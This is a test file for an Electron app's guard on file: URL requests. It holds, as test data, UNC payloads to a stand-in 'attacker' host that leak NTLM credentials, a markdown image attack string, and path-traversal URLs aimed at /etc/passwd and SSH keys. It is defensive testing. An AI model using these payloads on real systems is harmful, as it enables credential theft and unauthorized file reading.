// 安全:拒绝带主机名的 file: 请求(Windows 上即 UNC/SMB 外连 → NTLM 凭据泄露)。
// 攻击:markdown `![](//attacker/share/x.png)` 在 file:// 页面下解析为 file://attacker/share/x.png,
// CSP img-src 'self' 在 file: 页面下放行任意 file: URL(实测),渲染即触发零点击外连。
import { readdirSync, readFileSync } from 'node:fs';
import path from 'node:path';
import { describe, expect, it, vi } from 'vitest';
import {
  installFileRequestGuard,
  isBlockedFileRequest,
  isFileRequestOutsideRoot,
} from '../lib/file-request-policy';

describe('isBlockedFileRequest', () => {
  it('本地 file:///(空 host)放行:应用入口 / macOS / Windows 盘符路径', () => {
    for (const url of [
      'file:///Users/x/out-pack/renderer/index.html',
      'file:///Users/x/a.png',
      'file:///C:/Program%20Files/Continuo/resources/app/index.html',
    ]) {
      expect(isBlockedFileRequest(url)).toBe(false);
    }
  });

  it('带主机名的 file: 请求拒:UNC 外连 / localhost / IP / WebDAV @SSL', () => {
    for (const url of [
      'file://attacker/share/x.png',
      'file://attacker.example.com/share/x.png',
      'file://ATTACKER/share/x.png',
      'file://10.0.0.1/share/x.png',
      'file://attacker@SSL/share/x.png',
      'file://localhost/etc/hosts',
    ]) {
      expect(isBlockedFileRequest(url)).toBe(true);
    }
  });

  it('非 file 协议不处理(交给 CSP / 其它守卫)', () => {
    for (const url of ['https://example.com/x.png', 'http://localhost:5173/', 'data:image/png;base64,AA', 'blob:file:///x']) {
      expect(isBlockedFileRequest(url)).toBe(false);
    }
  });

  it('畸形 authority(WHATWG 解析会抛)→ 仍按非空 host 拒', () => {
    expect(isBlockedFileRequest('file://[bad/x')).toBe(true);
  });

  // 纵深:空 host 但路径以双分隔符开头 / 含编码分隔符 —— 若某层把它还原成 `\\host\share` 即 UNC 外连。
  // (Chromium Windows 下 GURL 通常已把四斜杠规范化成带 host、FileURLToFilePath 也拒 %5C/%2F,本守卫不依赖之。)
  it('空 host 的 UNC 变体拒:四斜杠 / 反斜杠 / 编码反斜杠或斜杠(不分大小写)', () => {
    for (const url of [
      'file:////attacker/share/x.png',
      'file://///attacker/share/x.png',
      'file:///\\\\attacker\\share\\x.png',
      'file:///\\attacker/share',
      'file:///%5C%5Cattacker%5Cshare%5Cx.png',
      'file:///%5c%5cattacker%5cshare%5cx.png',
      'file:///%2F%2Fattacker/share/x.png',
      'file:///Users/x/%2f/a.png',
      'file:///C:/a%5Cb.png',
    ]) {
      expect(isBlockedFileRequest(url), url).toBe(true);
    }
  });

  it('编码分隔符只查路径,不查 query:popout / 窗口 query 里的编码路径照常放行', () => {
    expect(
      isBlockedFileRequest('file:///Users/x/renderer/index.html?workspace=%2FUsers%2Fx%2Frepo&windowSeq=2'),
    ).toBe(false);
    expect(isBlockedFileRequest('file:///Users/x/renderer/index.html#/popout/%2Fpanel')).toBe(false);
    // 合法路径里的 `%25`(字面 %)不是编码分隔符
    expect(isBlockedFileRequest('file:///Users/x/a%252Fb/index.html')).toBe(false);
  });

  it('应用从 UNC 路径运行:与入口同 host 的请求放行(否则自拦白屏),其它 host 仍拒', () => {
    expect(isBlockedFileRequest('file://server/share/app/renderer/index.html', 'server')).toBe(false);
    expect(isBlockedFileRequest('file://SERVER/share/app/renderer/assets/a.js', 'server')).toBe(false);
    expect(isBlockedFileRequest('file://attacker/share/x.png', 'server')).toBe(true);
    // 同 host 也不放过路径变体
    expect(isBlockedFileRequest('file://server//attacker/x.png', 'server')).toBe(true);
    // 入口在本地(空 host)时不因 allowedHost='' 放行任何非空 host
    expect(isBlockedFileRequest('file://attacker/x.png', '')).toBe(true);
  });
});

// 安全:打包版页面源是 file://,CSP 的 'self' 匹配**任意** file: URL —— 页面内任何脚本(插件 / 注入内容)
// 都能 fetch / <script src> / import() / <link> / <iframe> 全盘本地文件(读文件、把工作区里的不受信 .js
// 当脚本执行)。守卫把 file: 请求限制在应用自身 renderer 产物目录(入口 index.html 所在目录树)内。
describe('isFileRequestOutsideRoot', () => {
  const ROOT = '/Applications/Continuo.app/Contents/Resources/app.asar/out-pack/renderer';

  it('renderer 产物目录树内(入口 / assets / 带 query·hash)→ 目录内', () => {
    for (const url of [
      `file://${ROOT}/index.html`,
      `file://${ROOT}/index.html?workspace=%2FUsers%2Fx%2Frepo&windowSeq=2#/popout`,
      `file://${ROOT}/assets/index-Cy0kbuFN.js`,
      `file://${ROOT}/assets/fonts/KaTeX_Main-Regular.woff2`,
    ]) {
      expect(isFileRequestOutsideRoot(url, ROOT), url).toBe(false);
    }
  });

  it('目录之外(用户文件 / 系统文件 / asar 内的兄弟目录 / 同前缀兄弟目录 / 根目录自身)→ 目录外', () => {
    for (const url of [
      'file:///Users/x/.ssh/id_rsa',
      'file:///etc/passwd',
      'file:///Applications/Continuo.app/Contents/Resources/app.asar/out-pack/main/index.js',
      'file:///Applications/Continuo.app/Contents/Resources/app.asar/package.json',
      `file://${ROOT}-evil/x.js`,
      `file://${ROOT}`,
      'file:///',
    ]) {
      expect(isFileRequestOutsideRoot(url, ROOT), url).toBe(true);
    }
  });

  it('穿越:.. / 编码的 %2e%2e / 反斜杠 / 混合大小写编码 → 先规范化再比较,落到目录外即拒', () => {
    for (const url of [
      `file://${ROOT}/assets/../../../../../../../etc/passwd`,
      `file://${ROOT}/assets/%2e%2e/%2E%2E/main/index.js`,
      `file://${ROOT}/assets/.%2e/%2e./../secret.txt`,
      `file://${ROOT}/assets\\..\\..\\main\\index.js`,
      `file://${ROOT}/../renderer-evil/x.js`,
    ]) {
      expect(isFileRequestOutsideRoot(url, ROOT), url).toBe(true);
    }
    // 穿越后仍落在目录内的不误杀
    expect(isFileRequestOutsideRoot(`file://${ROOT}/assets/../index.html`, ROOT)).toBe(false);
  });

  // Win32 会去掉路径段尾随的点与空格:`.. ` / `..%20` / `...` 在磁盘上等价于 `..` 或 `.`。URL 解析不认它们是
  // 穿越段,前缀比较会放行;只由点和空格组成的段一律视为穿越(合法资源名不会这样命名),各平台同规则。
  it('只由点和空格组成的路径段(.. 加尾随空格 / 三个点等)→ 视为穿越,拒', () => {
    for (const seg of ['..%20', '.%20', '..%20%20', '...', '.%20.']) {
      expect(isFileRequestOutsideRoot(`file://${ROOT}/assets/${seg}/${seg}/secret.js`, ROOT), seg).toBe(true);
    }
    // 名字里带点 / 空格的正常文件不误杀
    expect(isFileRequestOutsideRoot(`file://${ROOT}/assets/a..b.js`, ROOT)).toBe(false);
    expect(isFileRequestOutsideRoot(`file://${ROOT}/assets/my%20font.woff2`, ROOT)).toBe(false);
  });

  it('解码后才出现的穿越段 / 畸形编码 / 无法解析 → fail-closed 视为目录外', () => {
    expect(isFileRequestOutsideRoot(`file://${ROOT}/assets/%252e%252e/x.js`, ROOT)).toBe(false); // 字面 %2e%2e 文件名,不是穿越
    expect(isFileRequestOutsideRoot(`file://${ROOT}/assets/%E0%A4%A/x.js`, ROOT)).toBe(true);
    expect(isFileRequestOutsideRoot(`file://${ROOT}/assets/%5C..%5Cx.js`, ROOT)).toBe(true);
    expect(isFileRequestOutsideRoot('not a url', ROOT)).toBe(true);
    expect(isFileRequestOutsideRoot(`file://${ROOT}/index.html`, '')).toBe(true);
  });

  it('大小写:默认严格区分(fail-closed);Windows 盘符 / 路径不区分', () => {
    expect(isFileRequestOutsideRoot(`file://${ROOT.toUpperCase()}/index.html`, ROOT)).toBe(true);
    const WIN_ROOT = '/C:/Program%20Files/Continuo/resources/app.asar/out-pack/renderer';
    expect(
      isFileRequestOutsideRoot('file:///c:/Program%20Files/Continuo/resources/app.asar/out-pack/renderer/assets/a.js', WIN_ROOT, true),
    ).toBe(false);
    expect(isFileRequestOutsideRoot('file:///C:/Users/x/secret.txt', WIN_ROOT, true)).toBe(true);
    expect(isFileRequestOutsideRoot('file:///D:/Program%20Files/Continuo/resources/app.asar/out-pack/renderer/a.js', WIN_ROOT, true)).toBe(true);
  });

  it('含空格 / 非 ASCII 的安装路径:根与请求都按解码后比较', () => {
    const root = '/Users/%ED%99%8D%20%EA%B8%B8%EB%8F%99/My%20Apps/app.asar/out-pack/renderer';
    expect(isFileRequestOutsideRoot('file:///Users/%ED%99%8D%20%EA%B8%B8%EB%8F%99/My%20Apps/app.asar/out-pack/renderer/index.html', root)).toBe(false);
    expect(isFileRequestOutsideRoot('file:///Users/홍 길동/My Apps/app.asar/out-pack/renderer/assets/a.js', root)).toBe(false);
    expect(isFileRequestOutsideRoot('file:///Users/%ED%99%8D%20%EA%B8%B8%EB%8F%99/Documents/a.txt', root)).toBe(true);
  });
});

describe('installFileRequestGuard', () => {
  function install() {
    const onBeforeRequest = vi.fn();
    installFileRequestGuard({ webRequest: { onBeforeRequest } } as never, '/Users/x/renderer/index.html');
    const [filter, listener] = onBeforeRequest.mock.calls[0]! as [
      { urls: string[] },
      (d: { url: string; resourceType?: string }, cb: (r: { cancel?: boolean }) => void) => void,
    ];
    const cancelled = (url: string, resourceType?: string): boolean => {
      const cb = vi.fn();
      listener({ url, ...(resourceType === undefined ? {} : { resourceType }) }, cb);
      expect(cb).toHaveBeenCalledTimes(1);
      return (cb.mock.calls[0]![0] as { cancel: boolean }).cancel;
    };
    return { filter, listener, cancelled };
  }

  it('只对 file: 请求注册,UNC 取消、应用入口放行', () => {
    const { filter, listener } = install();
    expect(filter.urls).toEqual(['file://*/*']);
    const cb = vi.fn();
    listener({ url: 'file://attacker/share/x.png', resourceType: 'image' }, cb);
    listener({ url: 'file:///Users/x/renderer/index.html', resourceType: 'mainFrame' }, cb);
    listener({ url: 'file:////attacker/share/x.png', resourceType: 'image' }, cb);
    expect(cb.mock.calls).toEqual([[{ cancel: true }], [{ cancel: false }], [{ cancel: true }]]);
  });

  // resourceType 取值为 Electron 45.3.3 实测:fetch 与 XHR 都是 xhr,import() / <script> 是 script,
  // <link> / @import 是 stylesheet,<iframe> 是 subFrame,FontFace 是 font,<audio> 是 media。
  it('应用 renderer 目录内:各资源类型都放行', () => {
    const { cancelled } = install();
    for (const [url, type] of [
      ['file:///Users/x/renderer/index.html?windowSeq=2', 'mainFrame'],
      ['file:///Users/x/renderer/assets/index.js', 'script'],
      ['file:///Users/x/renderer/assets/index.css', 'stylesheet'],
      ['file:///Users/x/renderer/assets/KaTeX_Main.woff2', 'font'],
      ['file:///Users/x/renderer/assets/logo.png', 'image'],
      ['file:///Users/x/renderer/assets/data.json', 'xhr'],
    ] as const) {
      expect(cancelled(url, type), `${type} ${url}`).toBe(false);
    }
  });

  it('目录之外:fetch / xhr / script / stylesheet / subFrame / mainFrame / font / media / other 一律取消', () => {
    const { cancelled } = install();
    for (const type of ['xhr', 'script', 'stylesheet', 'subFrame', 'mainFrame', 'font', 'media', 'object', 'ping', 'other']) {
      expect(cancelled('file:///Users/x/.ssh/id_rsa', type), type).toBe(true);
      expect(cancelled('file:///Users/x/renderer/../workspace/evil.js', type), type).toBe(true);
      expect(cancelled('file:///Users/x/renderer/assets/%2e%2e/%2e%2e/main/index.js', type), type).toBe(true);
    }
    // 缺失 / 未知 resourceType 不享受例外
    expect(cancelled('file:///Users/x/a.png')).toBe(true);
    expect(cancelled('file:///Users/x/a.png', 'IMAGE')).toBe(true);
  });

  it('例外:目录之外的 image 仍放行(Markdown 里用户显式写的本地绝对路径图片),但 host / UNC 规则照旧', () => {
    const { cancelled } = install();
    expect(cancelled('file:///Users/x/Pictures/a.png', 'image')).toBe(false);
    expect(cancelled('file://attacker/share/a.png', 'image')).toBe(true);
    expect(cancelled('file:////attacker/share/a.png', 'image')).toBe(true);
    expect(cancelled('file:///%5C%5Cattacker%5Cshare%5Ca.png', 'image')).toBe(true);
  });

  it('判定抛错 → fail-closed 取消', () => {
    const { listener } = install();
    const cb = vi.fn();
    listener(
      {
        get url(): string {
          throw new Error('boom');
        },
        resourceType: 'image',
      },
      cb,
    );
    expect(cb.mock.calls).toEqual([[{ cancel: true }]]);
  });

  it('index.ts 在 whenReady 内、首窗创建前对 defaultSession 注册', () => {
    const src = readFileSync(path.join(__dirname, '../index.ts'), 'utf8');
    const ready = src.indexOf('app.whenReady()');
    const reg = src.indexOf('installFileRequestGuard(session.defaultSession, RENDERER_FILE)');
    const firstWin = src.indexOf('createMainWindow({', ready);
    expect(ready).toBeGreaterThan(-1);
    expect(reg).toBeGreaterThan(ready);
    expect(reg).toBeLessThan(firstWin);
  });

  it('主进程别处不得再注册 onBeforeRequest(同 session 同事件后注册会覆盖本守卫)', () => {
    const root = path.join(__dirname, '..');
    const offenders = (readdirSync(root, { recursive: true }) as string[])
      .filter((f) => f.endsWith('.ts') && !f.includes('__tests__') && !f.endsWith('file-request-policy.ts'))
      .filter((f) => readFileSync(path.join(root, f), 'utf8').includes('onBeforeRequest'));
    expect(offenders).toEqual([]);
  });
});
